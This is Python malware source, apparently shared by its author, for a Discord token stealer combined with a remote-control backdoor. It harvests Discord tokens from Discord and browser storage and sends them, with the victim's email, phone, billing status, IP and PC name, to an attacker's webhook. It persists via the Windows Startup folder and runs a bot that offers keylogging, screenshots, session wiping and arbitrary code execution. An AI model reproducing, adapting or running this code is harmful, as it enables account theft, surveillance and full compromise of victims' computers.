import os
import re
from random import randint
import shutil
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import tempfile

# Github: Strxngy
# Twitter: @Strxngy

webhook = "UR_WEBHOOK_HERE"
bottoken = "UR_DISCORD_BOT_TOKEN_HERE"
outputchannel = 000 # ID of the channel bot will send msg there once someone connected

regex = r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}'
tokens = list()
Logged = str()
threads = []
pc_username = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
TEMPDIR = LOCAL + "\\temp\\"
PATHS = {
    "discord": ROAMING + "\\Discord\\Local Storage\\leveldb\\",
    "ptb"    : ROAMING + "\\discordptb\\Local Storage\\leveldb\\",
    "canary" : ROAMING + "\\discordcanary\\Local Storage\\leveldb\\",
    "chrome" : LOCAL   + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "opera"  : ROAMING + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    "vivaldi": LOCAL   + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
    "yandex" : LOCAL   + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
    "brave"  : LOCAL   + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "firefox": ROAMING + "\\Mozilla\\Firefox\\Profiles\\"
} # Directories

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
    return url
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
ip = getip()

def Spread(target: str, platform:str):
    pathdir = os.path.join(target)

    for file in os.listdir(pathdir):
        if 'ldb' not in file and 'log' not in file: continue

        with open(os.path.join(pathdir, file), 'r+', errors='ignore') as data:
            if data.readable():
                match = re.findall(regex, data.read())
                if match:
                    for token in match:
                        if token not in tokens:
                            tokens.append(token)
                            Send(token, platform)

def Send(token: str, platform:str):
    user_data = getuserdata(token)
    if not user_data:
        return
    
    username = user_data["username"] + "#" + str(user_data["discriminator"])
    user_id = user_data["id"]
    avatar_id = user_data["avatar"]
    avatar_url = getavatar(user_id, avatar_id)
    email = user_data.get("email")
    phone = user_data.get("phone")
    nitro = bool(user_data.get("premium_type"))
    billing = bool(has_payment_methods(token))
    embeds = []
    embed = {
        "color": 0x0eec59,
        "fields": [
            {
                "name": "**Account Info**",
                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                "inline": True
            },
            {
                "name": "**PC Info**",
                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                "inline": True
            },
            {
                "name": "**Token**",
                "value": token,
                "inline": False
            }
        ],
        "author": {
            "name": f"{username} ({user_id})",
            "icon_url": avatar_url
        },
        'footer': {
            'text': 'Developed by @Strxngy',
            'icon_url': "https://upload.wikimedia.org/wikipedia/fr/thumb/c/c8/Twitter_Bird.svg/langfr-280px-Twitter_Bird.svg.png"
        }
    }
    embeds.append(embed)
    webhookdata = {
        "content": " ",
        "embeds": embeds
    }
    urlopen(Request(webhook, data=dumps(webhookdata).encode(), headers=getheaders()))

def backdoor():
    try:
        import subprocess
        for i in range(2):
            try:
                from PIL import ImageGrab
                import time
                import sys
                from io import StringIO
                import contextlib
                import requests
                import discord
                from discord.ext import commands
                import discord.utils
                import asyncio
                from pynput import keyboard
                from pynput.keyboard import KeyCode
                from threading import Thread
                import psutil
                import logging
                import win32api
                import win32gui
            except:
                subprocess.Popen(["python", "-m", "pip", "install", "--upgrade", "pip"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "psutil"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "pillow"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "requests"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "pynput"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "pywin32"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "win32gui"], shell=True).wait()
                subprocess.Popen(["python", "-m", "pip", "install", "discord"], shell=True).wait()

        client = commands.Bot(command_prefix = "!")
        @client.event
        async def on_ready():
            print('We have logged in as {0.user}'.format(client))
            c = client.get_channel(outputchannel)
            await c.send(f"***`{ip}`** has been connected*")
        
        # i've copied this keylogger idk forom who
        @client.command(pass_context=True)
        async def startkeylogger(ctx, window:str = None):
            logging.basicConfig(filename=(TEMPDIR + "key_log.txt"),
                filemode='w',
                level=logging.DEBUG,
                format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                    if active_window == window or window == None:
                        print(str(key), end='', flush=True)
                        logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global threads
            thd = Thread(target=keylog)
            thd._running = True
            thd.daemon = True
            thd.start()
            threads.append(thd)
            await ctx.channel.send("Keylogger successfuly started")
        
        @client.command(pass_context=True)
        async def stopkeylogger(ctx):
            if len(threads) == 0:
                await ctx.channel.send("There is no active keyloggers")
                return
            for thd in threads:
                thd._running = False
                threads.pop(thd)
            await ctx.channel.send("Keylogger successfuly stopped")
        
        @client.command(pass_context=True)
        async def dumpkeylogger(ctx):
            file_keys = TEMPDIR + "key_log.txt"
            file = discord.File(file_keys, filename=file_keys)
            await ctx.channel.send("Command successfuly executed", file=file)
            await asyncio.sleep(1)
            subprocess.Popen(["del", file_keys], shell=True)
        
        @client.command(pass_context=True)
        async def logout(ctx):
            procs = psutil.process_iter()
            for i in procs:
                if "discord" in i.name().lower():
                    parent = psutil.Process(i.pid)
                    parent.kill()
            await asyncio.sleep(3)
            for file in os.listdir(PATHS["discord"]):
                try: os.remove(os.path.join(PATHS["discord"], file))
                except: print(file)
            os.startfile(ROAMING + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk")

        @client.command(pass_context=True)
        async def grab(ctx):
            for platform, dirpath in PATHS.items():
                if not os.path.exists(dirpath): continue
                Spread(dirpath, platform)
            await ctx.channel.send("The End")
        
        @client.command(pass_context=True)
        async def users(ctx):
            await ctx.channel.send(f"{getip()} - {pc_username} - {pc_name}")
        
        @client.command(pass_context=True)
        async def screenshot(ctx):
            with tempfile.TemporaryDirectory() as t:
                snapshot = ImageGrab.grab()
                save_path = t + "Capture.jpg"
                snapshot.save(save_path)
                with open(file=save_path, mode='rb') as f:
                    my_file = discord.File(f)
                    await ctx.channel.send(file=my_file)
        
        @client.command(pass_context=True)
        async def message(ctx, *, arg):
            with open(TEMPDIR + "message.txt", "w") as f:
                f.write(arg)
                os.startfile(TEMPDIR + "message.txt")
            
            await ctx.channel.send("Message Opened xD")

        @client.command(pass_context=True)
        async def execute(ctx, *, code:str):
            @contextlib.contextmanager
            def stdoutIO(stdout=None):
                old = sys.stdout
                if stdout is None: stdout = StringIO()
                sys.stdout = stdout
                yield stdout
                sys.stdout = old
                    
            with stdoutIO() as s:
                exec(code)
                # avoid using os.system(). simple example =>
                # .execute import psutil
                # procs = psutil.process_iter()
                # for p in procs:
                #     print(p.name())
            await ctx.channel.send(s.getvalue())
        
        @client.command(pass_context=True)
        async def disconnect(ctx, vip:str = None):
            if getip() == vip or vip is None:
                await ctx.channel.send(f"***{ip}** has been disconnected*")
                exit(0)
        
        @client.event
        async def on_command_error(ctx, error):
            await ctx.channel.send(str(error))
        
        client.run(bottoken)
    except Exception as e:
        form = { "content": f"Error: {e}" }
        urlopen(Request(webhook, data=dumps(form).encode(), headers=getheaders()))

if "Startup" not in __file__:
    newpath = ROAMING + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Discord.pyw"
    shutil.copyfile(__file__, newpath)
    os.startfile(newpath)
elif "Startup" in __file__:
    backdoor()

for platform, dirpath in PATHS.items():
    if not os.path.exists(dirpath): continue
    Spread(dirpath, platform)
